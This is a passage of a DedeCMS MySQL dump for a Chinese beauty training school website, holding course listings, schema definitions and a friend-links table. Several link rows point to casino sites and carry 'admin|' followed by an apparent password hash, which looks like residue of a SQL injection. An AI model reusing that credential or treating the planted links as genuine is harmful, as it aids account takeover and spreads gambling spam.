islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:senddate>	\n<field:flag itemname=\"推荐属性\" autofield=\"0\" notsend=\"0\" type=\"checkbox\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:flag>	\n<field:litpic itemname=\"缩略图\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"60\" page=\"\"></field:litpic>	\n<field:userip itemname=\"会员IP\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"0\"  maxlength=\"15\" page=\"\"></field:userip>	\n<field:lastpost itemname=\"最后评论时间\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:lastpost>	\n<field:scores itemname=\"评论积分\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:scores>	\n<field:goodpost itemname=\"好评数\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:goodpost>	\n<field:badpost itemname=\"差评数\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:badpost>	\n<field:nativeplace itemname=\"地区\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"250\" page=\"\">	\n</field:nativeplace>	\n<field:infotype itemname=\"信息类型\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"250\" page=\"\">	\n</field:infotype>	\n<field:body itemname=\"信息内容\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:body>	\n<field:endtime itemname=\"截止日期\" autofield=\"1\" notsend=\"0\" type=\"datetime\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:endtime>	\n<field:linkman itemname=\"联系人\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"50\" page=\"\">	\n</field:linkman>	\n<field:tel itemname=\"联系电话\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\" maxlength=\"50\" page=\"\">	\n</field:tel>	\n<field:email itemname=\"电子邮箱\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"50\" page=\"\">	\n</field:email>	\n<field:address itemname=\"地址\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"100\" page=\"\">	\n</field:address>	\n', 'channel,arcrank,mid,click,title,senddate,flag,litpic,lastpost,scores,goodpost,badpost,nativeplace,infotype,endtime', '', '-1', '1', '1', '-1', '', '0', '0', '0', '1', '信息标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('17', 'article17', '专业课程', 'dede_archives', 'dede_addonarticle17', 'article_add.php', 'content_list.php', 'article_edit.php', 'article_add.php', 'content_list.php', 'article_edit.php', '<field:body itemname=\"文章内容\" autofield=\"0\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"split\">	\n</field:body>	\n\n<field:kbsj itemname=\"课程学费\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:kbsj>\r\n\r\n\r\n\r\n\n<field:quantity itemname=\"班级人数\" autofield=\"1\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:quantity>\r\n\n<field:sy itemname=\"剩余名额\" autofield=\"1\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:sy>\r\n\n<field:price itemname=\"活动价格\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:price>\r\n\r\n\r\n', 'body,kbsj,price', null, '1', '1', '1', '-1', '', '10', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('18', 'teachers', '师资力量', 'dede_archives', 'dede_teachers', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '<field:leavetime itemname=\"圆型图片\" autofield=\"1\" notsend=\"0\" type=\"imgfile\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:leavetime>\r\n<field:detail itemname=\"详细\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:detail>\r\n', '', null, '0', '1', '0', '-1', '', '0', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('19', 'stu', '优秀学员', 'dede_archives', 'dede_stu', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '<field:leavetime itemname=\"离校时间（仅添加学员时填写）\" autofield=\"1\" notsend=\"0\" type=\"datetime\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:leavetime>\r\n<field:pic2 itemname=\"缩略图2（鼠标悬浮时）\" autofield=\"1\" notsend=\"0\" type=\"imgfile\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:pic2>\r\n<field:xxxx itemname=\"详细信息\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:xxxx>\r\n', '', null, '0', '1', '0', '-1', '', '0', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('20', 'production', '学员作品', 'dede_archives', 'dede_production', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '\r\n\r\n\r\n\n<field:detail itemname=\"详细\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:detail>\r\n', '', null, '0', '1', '0', '-1', '', '0', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('21', 'class', '开班信息', 'dede_archives', 'dede_class', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '<field:btime itemname=\"活动价格\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:btime>\r\n\r\n\r\n<field:cnt itemname=\"开班人数\" autofield=\"1\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:cnt>\r\n<field:syrs itemname=\"剩余名额\" autofield=\"1\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:syrs>\r\n<field:price itemname=\"费用\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:price>\r\n<field:pic2 itemname=\"缩略图2（鼠标悬浮时）\" autofield=\"1\" notsend=\"0\" type=\"imgfile\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:pic2>\r\n<field:xx itemname=\"详细\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">\r\n</field:xx>\r\n', 'btime', null, '0', '1', '0', '-1', '', '0', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('22', 'honor', '资质荣誉', 'dede_archives', 'dede_honor', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '', '', null, '0', '1', '0', '-1', '', '0', '0', '1', '1', '标题', '0', '0');

-- ----------------------------
-- Table structure for `dede_class`
-- ----------------------------
DROP TABLE IF EXISTS `dede_class`;
CREATE TABLE `dede_class` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `btime` int(11) NOT NULL DEFAULT '0',
  `cnt` int(11) NOT NULL DEFAULT '0',
  `syrs` int(11) NOT NULL DEFAULT '0',
  `price` float NOT NULL DEFAULT '0',
  `pic2` varchar(250) NOT NULL DEFAULT '',
  `xx` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_class
-- ----------------------------
INSERT INTO dede_class VALUES ('96', '23', '', '', '220.166.213.55', '2000', '20', '3', '2480', '/uploads/150418/1-15041Q20335239.jpg', '<div style=\"margin: 0px; padding: 0px; border: none; font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	<span style=\"font-size:9px;\"><strong><font color=\"#ff0000\">三月美甲培训 火热报名中。详情请联系客服或拨打我们的热线电话。</font></strong></span></div>\r\n');
INSERT INTO dede_class VALUES ('108', '23', '', '', '220.166.213.55', '3000', '20', '2', '3980', '', '<span style=\"color:#ff0000;\"><span style=\"font-family: 微软雅黑; font-size: 14px;\">美甲创业班 学期:2个半月学费:原价：7940元优惠价：3980元<br />\r\n上课时间：周一至周五 招生对象：美甲爱好者，创业开店人士，<br />\r\n有无美甲基础均可学习&nbsp;</span></span>');
INSERT INTO dede_class VALUES ('109', '23', '', '', '220.166.213.55', '5000', '20', '8', '6160', '', '<span style=\"margin: 0px 20px 0px auto; padding: 0px; font-size: 26px; font-family: 微软雅黑; color: rgb(255, 0, 0);\"><span style=\"margin: 0px 20px 0px auto; padding: 0px; font-size: 14px;\">尖端化妆、美甲精英班：</span><span style=\"margin: 0px 20px 0px auto; padding: 0px; font-size: 10px;\"><strong style=\"margin: 0px auto; padding: 0px;\">学期：4个半月</strong>&nbsp;&nbsp;&nbsp;&nbsp;<strong style=\"margin: 0px auto; padding: 0px;\">学费：</strong><strong style=\"margin: 0px auto; padding: 0px;\">原价：</strong><strong style=\"margin: 0px auto; padding: 0px;\">8780</strong><strong style=\"margin: 0px auto; padding: 0px;\">元</strong>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong style=\"margin: 0px auto; padding: 0px;\">优惠价：6160元（赠送化妆、美甲工具及产</strong></span></span><span style=\"margin: 0px 20px 0px auto; padding: 0px; font-size: 26px; font-family: 微软雅黑; color: rgb(255, 0, 0);\"><span style=\"margin: 0px 20px 0px auto; padding: 0px; font-size: 14px;\">课程内容：基础化妆+影楼化妆+时尚创意妆+礼服搭配+基础美甲+尖端美甲+美甲店面营销管理课程</span></span>');

-- ----------------------------
-- Table structure for `dede_co_htmls`
-- ----------------------------
DROP TABLE IF EXISTS `dede_co_htmls`;
CREATE TABLE `dede_co_htmls` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(100) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `isdown` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isexport` tinyint(1) NOT NULL DEFAULT '0',
  `result` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `nid` (`nid`) USING BTREE,
  KEY `typeid` (`typeid`,`title`,`url`,`dtime`,`isdown`,`isexport`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_co_htmls
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_co_mediaurls`
-- ----------------------------
DROP TABLE IF EXISTS `dede_co_mediaurls`;
CREATE TABLE `dede_co_mediaurls` (
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `hash` char(32) NOT NULL DEFAULT '',
  `tofile` char(60) NOT NULL DEFAULT '',
  KEY `hash` (`hash`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_co_mediaurls
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_co_note`
-- ----------------------------
DROP TABLE IF EXISTS `dede_co_note`;
CREATE TABLE `dede_co_note` (
  `nid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `notename` varchar(50) NOT NULL DEFAULT '',
  `sourcelang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `cotime` int(10) unsigned NOT NULL DEFAULT '0',
  `pnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isok` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `usemore` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `listconfig` text,
  `itemconfig` text,
  PRIMARY KEY (`nid`),
  KEY `isok` (`isok`,`channelid`,`cotime`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_co_note
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_co_onepage`
-- ----------------------------
DROP TABLE IF EXISTS `dede_co_onepage`;
CREATE TABLE `dede_co_onepage` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(60) NOT NULL DEFAULT '',
  `title` varchar(60) NOT NULL DEFAULT '',
  `issource` smallint(6) NOT NULL DEFAULT '1',
  `lang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `rule` text,
  PRIMARY KEY (`id`),
  KEY `url` (`url`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_co_onepage
-- ----------------------------
INSERT INTO dede_co_onepage VALUES ('5', 'www.dedecms.com', '织梦网络', '1', 'gb2312', '<div class=\"content\">{@body}<div class=\"cupage\">');
INSERT INTO dede_co_onepage VALUES ('4', 'www.techweb.com.cn', 'Techweb', '1', 'gb2312', '<div class=\"content_txt\">{@body}</div>	\n');
INSERT INTO dede_co_onepage VALUES ('6', 'tw.news.yahoo.com', '台湾雅虎', '1', 'big5', '<div id=\"ynwsartcontent\">{@body}</div>	\n');

-- ----------------------------
-- Table structure for `dede_co_urls`
-- ----------------------------
DROP TABLE IF EXISTS `dede_co_urls`;
CREATE TABLE `dede_co_urls` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `hash` varchar(32) NOT NULL DEFAULT '',
  `nid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_co_urls
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_diyforms`
-- ----------------------------
DROP TABLE IF EXISTS `dede_diyforms`;
CREATE TABLE `dede_diyforms` (
  `diyid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '',
  `posttemplate` varchar(50) NOT NULL,
  `viewtemplate` varchar(50) NOT NULL,
  `listtemplate` varchar(50) NOT NULL,
  `table` varchar(50) NOT NULL DEFAULT '',
  `info` text,
  `public` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`diyid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_diyforms
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_dl_log`
-- ----------------------------
DROP TABLE IF EXISTS `dede_dl_log`;
CREATE TABLE `dede_dl_log` (
  `id` mediumint(10) unsigned NOT NULL AUTO_INCREMENT,
  `ip` char(16) NOT NULL,
  `lang` char(6) NOT NULL,
  `dtype` varchar(10) NOT NULL,
  `dltime` int(10) unsigned NOT NULL DEFAULT '0',
  `referrer` varchar(255) NOT NULL DEFAULT '',
  `user_agent` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `dltime` (`dltime`) USING BTREE,
  KEY `dl_ip` (`ip`,`dltime`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_dl_log
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_downloads`
-- ----------------------------
DROP TABLE IF EXISTS `dede_downloads`;
CREATE TABLE `dede_downloads` (
  `hash` char(32) NOT NULL,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `downloads` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_downloads
-- ----------------------------
INSERT INTO dede_downloads VALUES ('d41d8cd98f00b204e9800998ecf8427e', '0', '247');

-- ----------------------------
-- Table structure for `dede_erradd`
-- ----------------------------
DROP TABLE IF EXISTS `dede_erradd`;
CREATE TABLE `dede_erradd` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL,
  `mid` mediumint(8) unsigned DEFAULT NULL,
  `title` char(60) NOT NULL DEFAULT '',
  `type` smallint(6) NOT NULL DEFAULT '0',
  `errtxt` mediumtext,
  `oktxt` mediumtext,
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  KEY `id` (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=99 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_erradd
-- ----------------------------
INSERT INTO dede_erradd VALUES ('1', '0', '0', '', '0', '', '', '1430385043');
INSERT INTO dede_erradd VALUES ('2', '0', '0', '', '0', '', '', '1430395875');
INSERT INTO dede_erradd VALUES ('3', '0', '0', '', '0', '', '', '1430413268');
INSERT INTO dede_erradd VALUES ('4', '0', '0', '', '0', '', '', '1430414095');
INSERT INTO dede_erradd VALUES ('5', '0', '0', '', '0', '', '', '1430415551');
INSERT INTO dede_erradd VALUES ('6', '0', '0', '', '0', '', '', '1430416033');
INSERT INTO dede_erradd VALUES ('7', '0', '0', '', '0', '', '', '1430446172');
INSERT INTO dede_erradd VALUES ('8', '0', '0', '', '0', '', '', '1430455853');
INSERT INTO dede_erradd VALUES ('9', '0', '0', '', '0', '', '', '1430516713');
INSERT INTO dede_erradd VALUES ('10', '0', '0', '', '0', '', '', '1430526797');
INSERT INTO dede_erradd VALUES ('11', '0', '0', '', '0', '', '', '1430558762');
INSERT INTO dede_erradd VALUES ('12', '0', '0', '', '0', '', '', '1430584623');
INSERT INTO dede_erradd VALUES ('13', '0', '0', '', '0', '', '', '1430611772');
INSERT INTO dede_erradd VALUES ('14', '0', '0', '', '0', '', '', '1430614624');
INSERT INTO dede_erradd VALUES ('15', '0', '0', '', '0', '', '', '1430644098');
INSERT INTO dede_erradd VALUES ('16', '0', '0', '', '0', '', '', '1430645657');
INSERT INTO dede_erradd VALUES ('17', '0', '0', '', '0', '', '', '1430697790');
INSERT INTO dede_erradd VALUES ('18', '0', '0', '', '0', '', '', '1430705385');
INSERT INTO dede_erradd VALUES ('19', '0', '0', '', '0', '', '', '1430707531');
INSERT INTO dede_erradd VALUES ('20', '0', '0', '', '0', '', '', '1430726357');
INSERT INTO dede_erradd VALUES ('21', '0', '0', '', '0', '', '', '1430847275');
INSERT INTO dede_erradd VALUES ('22', '0', '0', '', '0', '', '', '1430847277');
INSERT INTO dede_erradd VALUES ('23', '0', '0', '', '0', '', '', '1430889060');
INSERT INTO dede_erradd VALUES ('24', '0', '0', '', '0', '', '', '1430894327');
INSERT INTO dede_erradd VALUES ('25', '0', '0', '', '0', '', '', '1430911394');
INSERT INTO dede_erradd VALUES ('26', '0', '0', '', '0', '', '', '1430911405');
INSERT INTO dede_erradd VALUES ('27', '0', '0', '', '0', '', '', '1430924164');
INSERT INTO dede_erradd VALUES ('28', '0', '0', '', '0', '', '', '1430967926');
INSERT INTO dede_erradd VALUES ('29', '0', '0', '', '0', '', '', '1430971199');
INSERT INTO dede_erradd VALUES ('30', '0', '0', '', '0', '', '', '1430998610');
INSERT INTO dede_erradd VALUES ('31', '0', '0', '', '0', '', '', '1431012439');
INSERT INTO dede_erradd VALUES ('32', '0', '0', '', '0', '', '', '1431022711');
INSERT INTO dede_erradd VALUES ('33', '0', '0', '', '0', '', '', '1431058995');
INSERT INTO dede_erradd VALUES ('34', '0', '0', '', '0', '', '', '1431059773');
INSERT INTO dede_erradd VALUES ('35', '0', '0', '', '0', '', '', '1431060885');
INSERT INTO dede_erradd VALUES ('36', '0', '0', '', '0', '', '', '1431066718');
INSERT INTO dede_erradd VALUES ('37', '0', '0', '', '0', '', '', '1431113535');
INSERT INTO dede_erradd VALUES ('38', '0', '0', '', '0', '', '', '1431185593');
INSERT INTO dede_erradd VALUES ('39', '0', '0', '', '0', '', '', '1431197685');
INSERT INTO dede_erradd VALUES ('40', '0', '0', '', '0', '', '', '1431294092');
INSERT INTO dede_erradd VALUES ('41', '0', '0', '', '0', '', '', '1431308988');
INSERT INTO dede_erradd VALUES ('42', '0', '0', '', '0', '', '', '1431314735');
INSERT INTO dede_erradd VALUES ('43', '0', '0', '', '0', '', '', '1431338683');
INSERT INTO dede_erradd VALUES ('44', '0', '0', '', '0', '', '', '1431415340');
INSERT INTO dede_erradd VALUES ('45', '0', '0', '', '0', '', '', '1431436475');
INSERT INTO dede_erradd VALUES ('46', '0', '0', '', '0', '', '', '1431438008');
INSERT INTO dede_erradd VALUES ('47', '0', '0', '', '0', '', '', '1431446304');
INSERT INTO dede_erradd VALUES ('48', '0', '0', '', '0', '', '', '1431447879');
INSERT INTO dede_erradd VALUES ('49', '0', '0', '', '0', '', '', '1431451097');
INSERT INTO dede_erradd VALUES ('50', '0', '0', '', '0', '', '', '1431506965');
INSERT INTO dede_erradd VALUES ('51', '0', '0', '', '0', '', '', '1431521095');
INSERT INTO dede_erradd VALUES ('52', '0', '0', '', '0', '', '', '1431529354');
INSERT INTO dede_erradd VALUES ('53', '0', '0', '', '0', '', '', '1431582667');
INSERT INTO dede_erradd VALUES ('54', '0', '0', '', '0', '', '', '1431582671');
INSERT INTO dede_erradd VALUES ('55', '0', '0', '', '0', '', '', '1431582672');
INSERT INTO dede_erradd VALUES ('56', '0', '0', '', '0', '', '', '1431588668');
INSERT INTO dede_erradd VALUES ('57', '0', '0', '', '0', '', '', '1431588675');
INSERT INTO dede_erradd VALUES ('58', '0', '0', '', '0', '', '', '1431601533');
INSERT INTO dede_erradd VALUES ('59', '0', '0', '', '0', '', '', '1431622604');
INSERT INTO dede_erradd VALUES ('60', '0', '0', '', '0', '', '', '1431625169');
INSERT INTO dede_erradd VALUES ('61', '0', '0', '', '0', '', '', '1431633292');
INSERT INTO dede_erradd VALUES ('62', '0', '0', '', '0', '', '', '1431647948');
INSERT INTO dede_erradd VALUES ('63', '0', '0', '', '0', '', '', '1431662573');
INSERT INTO dede_erradd VALUES ('64', '0', '0', '', '0', '', '', '1431663100');
INSERT INTO dede_erradd VALUES ('65', '0', '0', '', '0', '', '', '1431663945');
INSERT INTO dede_erradd VALUES ('66', '0', '0', '', '0', '', '', '1431666676');
INSERT INTO dede_erradd VALUES ('67', '0', '0', '', '0', '', '', '1431671361');
INSERT INTO dede_erradd VALUES ('68', '0', '0', '', '0', '', '', '1431677339');
INSERT INTO dede_erradd VALUES ('69', '0', '0', '', '0', '', '', '1431698189');
INSERT INTO dede_erradd VALUES ('70', '0', '0', '', '0', '', '', '1431735841');
INSERT INTO dede_erradd VALUES ('71', '0', '0', '', '0', '', '', '1431813287');
INSERT INTO dede_erradd VALUES ('72', '0', '0', '', '0', '', '', '1431822429');
INSERT INTO dede_erradd VALUES ('73', '0', '0', '', '0', '', '', '1431863619');
INSERT INTO dede_erradd VALUES ('74', '0', '0', '', '0', '', '', '1431871547');
INSERT INTO dede_erradd VALUES ('75', '0', '0', '', '0', '', '', '1431921495');
INSERT INTO dede_erradd VALUES ('76', '0', '0', '', '0', '', '', '1431930235');
INSERT INTO dede_erradd VALUES ('77', '0', '0', '', '0', '', '', '1432030092');
INSERT INTO dede_erradd VALUES ('78', '0', '0', '', '0', '', '', '1432056106');
INSERT INTO dede_erradd VALUES ('79', '0', '0', '', '0', '', '', '1432099330');
INSERT INTO dede_erradd VALUES ('80', '0', '0', '', '0', '', '', '1432114611');
INSERT INTO dede_erradd VALUES ('81', '0', '0', '', '0', '', '', '1432129011');
INSERT INTO dede_erradd VALUES ('82', '0', '0', '', '0', '', '', '1432165655');
INSERT INTO dede_erradd VALUES ('83', '0', '0', '', '0', '', '', '1432166320');
INSERT INTO dede_erradd VALUES ('84', '0', '0', '', '0', '', '', '1432180841');
INSERT INTO dede_erradd VALUES ('85', '0', '0', '', '0', '', '', '1432229738');
INSERT INTO dede_erradd VALUES ('86', '0', '0', '', '0', '', '', '1432279963');
INSERT INTO dede_erradd VALUES ('87', '0', '0', '', '0', '', '', '1432324819');
INSERT INTO dede_erradd VALUES ('88', '0', '0', '', '0', '', '', '1432369909');
INSERT INTO dede_erradd VALUES ('89', '0', '0', '', '0', '', '', '1432376307');
INSERT INTO dede_erradd VALUES ('90', '0', '0', '', '0', '', '', '1432404661');
INSERT INTO dede_erradd VALUES ('91', '0', '0', '', '0', '', '', '1432422751');
INSERT INTO dede_erradd VALUES ('92', '0', '0', '', '0', '', '', '1432425050');
INSERT INTO dede_erradd VALUES ('93', '0', '0', '', '0', '', '', '1432447294');
INSERT INTO dede_erradd VALUES ('94', '0', '0', '', '0', '', '', '1432447358');
INSERT INTO dede_erradd VALUES ('95', '0', '0', '', '0', '', '', '1432520374');
INSERT INTO dede_erradd VALUES ('96', '0', '0', '', '0', '', '', '1432522085');
INSERT INTO dede_erradd VALUES ('97', '0', '0', '', '0', '', '', '1432567278');
INSERT INTO dede_erradd VALUES ('98', '0', '0', '', '0', '', '', '1432580267');

-- ----------------------------
-- Table structure for `dede_feedback`
-- ----------------------------
DROP TABLE IF EXISTS `dede_feedback`;
CREATE TABLE `dede_feedback` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `arctitle` varchar(60) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `bad` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `good` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ftype` set('feedback','good','bad') NOT NULL DEFAULT 'feedback',
  `face` smallint(5) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `aid` (`aid`,`ischeck`,`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_feedback
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_flink`
-- ----------------------------
DROP TABLE IF EXISTS `dede_flink`;
CREATE TABLE `dede_flink` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sortrank` smallint(6) NOT NULL DEFAULT '0',
  `url` char(60) NOT NULL DEFAULT '',
  `webname` char(30) NOT NULL DEFAULT '',
  `msg` char(200) NOT NULL DEFAULT '',
  `email` char(50) NOT NULL DEFAULT '',
  `logo` char(60) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ischeck` smallint(6) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=28 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_flink
-- ----------------------------
INSERT INTO dede_flink VALUES ('2', '1', 'http://www.dedecms.com', '织梦CMS官方', '', '', '', '1226375403', '1', '2');
INSERT INTO dede_flink VALUES ('9', '1', 'http://docs.dedecms.com/', 'DedeCMS维基手册', '', '', '', '1227772717', '1', '2');
INSERT INTO dede_flink VALUES ('8', '1', 'http://bbs.dedecms.com', '织梦技术论坛', '', '', '', '1227772703', '1', '2');
INSERT INTO dede_flink VALUES ('10', '50', 'http://www.kxbc888.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('11', '50', 'http://www.kxbc888.com/', '', '', '', 'http://www.kxbc888.com/dede/logo.php', '1431113554', '1', '0');
INSERT INTO dede_flink VALUES ('12', '50', 'http://www.yifayulechang.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('13', '50', 'http://www.tb0006xz.com/', 'tb0006.com', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('14', '50', 'http://www.aomenpujingduchangguanwang.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
